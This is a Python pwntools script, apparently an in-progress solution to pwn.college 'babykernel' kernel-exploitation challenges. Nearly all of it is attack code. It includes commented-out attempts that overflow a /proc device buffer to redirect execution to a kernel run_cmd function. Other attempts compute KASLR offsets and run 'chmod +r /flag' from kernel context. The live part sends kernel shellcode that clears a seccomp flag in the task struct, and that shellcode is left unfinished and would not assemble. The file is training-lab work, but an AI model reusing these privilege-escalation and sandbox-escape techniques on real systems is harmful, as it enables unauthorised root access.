from pwn import *
import fcntl

context.arch = 'amd64'
context.encoding ='latin'
context.log_level = 'INFO'
warnings.simplefilter('ignore')


# assembly ="""
# .global _start
# .intel_syntax noprefix
# _start:

# lea rdi, [rip+cmd]
# mov rax, 0xffffffff81089580
# call rax

# cmd:
#     .string "chmod +r /flag"


# """
# # ffffffff81089580 t run_cmd
# # ffffffffc000064c t device_write [challenge]
# # ffffffff81088670
# # ffffffff 8568 9580 t run_cmd
# # ffffffff 8108 9580 t run_cmd
# # ffffffff a2e8 9580 t run_cmd
# # ffffffff 9428 9580 t run_cmd

# # \x80\x95\x08\x81\xff\xff\xff\xff
# # \x80\x95\x48\x9e\xff\xff\xff\xff


# # 239
# # os.write(os.open("/proc/pwncollege", os.O_RDWR), b'/home/hacker/out\0'+ b'a'*239 + b'\x60\x95\x18\x81\xff\xff\xff\xff')
# # for i in range(255):
# # \x63\xab\xb9\xff\xff\xff\xff

# # 183712
# # \x20\x63\x2b
# # \x20\x63\x2b\xaa\xff\xff\xff\xff
# # 0xffffaa2b6320-183712



# # \x20\x63\x2b\x89\xff\xff\xff\xff
# # 0xffffffff892b6320-183712

# # 0xffffffffb9ab6320-0xffffffffb9a89580
# # \x20\x63\x2b\xad\xff\xff\xff\xff


# # 10.0 -> 0xffffffff892b6320-183712=0xffffffff89289580=run_cmd
# # 10.1 -> 0xffffffffad2b6320-183712=0xffffffffad289580
# # os.write(os.open("/proc/pwncollege", os.O_RDWR), b"a" * 256)
# os.write(os.open("/proc/pwncollege", os.O_RDWR), b'/home/hacker/out\0'+ b'a'*239 + b'\x80\x95\x28\xad\xff\xff\xff\xff')

# # ffffffffa1289580 t run_cmd

# # 10635726
# # 10635726

# # os.sendfile(1, os.open("/flag", 0), 0, 1000)


# # with process("/challenge/babykernel_level8.0") as p:
# #     os.write(3, asm(assembly))
# #     info(p.readrepeat(1))
# #     p.send(asm(assembly))
# #     info(p.readrepeat(1))
# #     os.sendfile(1, os.open("/flag", 0), 0, 1000)
# #     info(p.readrepeat(1))

#! /usr/bin/env python
# import re


# ebin = open("~/e.bin", "r")

with process(["/challenge/babykernel_level12.0"]) as p:
    # print(f"parent pid={p.pid}")
    # print(f"children={proc.descendants(p.pid)}")
    assembly = f"""
    .global _start
    .intel_syntax noprefix
    _start:
        mov rax, 1
        lea rsi, [rip+kernel_shellcode]
        mov rdi, 3
        mov rdx, 18
        syscall

        ret

    kernel_shellcode:
        mov rbx, qword ptr gs:0x15d00
        and qword ptr [rbx], 0xfffffffffffffeff
        mov rcx, 0x0
    loop:
        
        mov rdi, 0x0
        mov rax, 

        ret



    mem:
        .string "/proc/{p.pid+1}/mem"
    
    """
    info(p.readrepeat(1))
    p.send(asm(assembly))
    info(p.readrepeat(1))




# loop:
    

#     lea rbx, [rip+check]
#     cmp qword ptr [r11], rbx
#     jne fail
    

    

# fail:
#     add r11, 8
#     #jmp loop


#     ret




# ffffffffc0000c0c





# maps_file = open(f"/proc/{p.pid}/maps", 'r')
#     mem_file = open(f"/proc/{p.pid}/mem", 'rb', 0)
#     output_file = open("self.dump", 'wb')
#     for line in maps_file.readlines():  # for each mapped region
#         m = re.match(r'([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])', line)
#         if m.group(3) == 'r':  # if this is a readable region
#             start = int(m.group(1), 16)
#             end = int(m.group(2), 16)
#             print(f'start={start}, end={end}')
#             mem_file.seek(start)  # seek to region start
#             chunk = mem_file.read(end - start)  # read region contents
#             output_file.write(chunk)  # dump contents to standard output
#     maps_file.close()
#     mem_file.close()
#     output_file.close()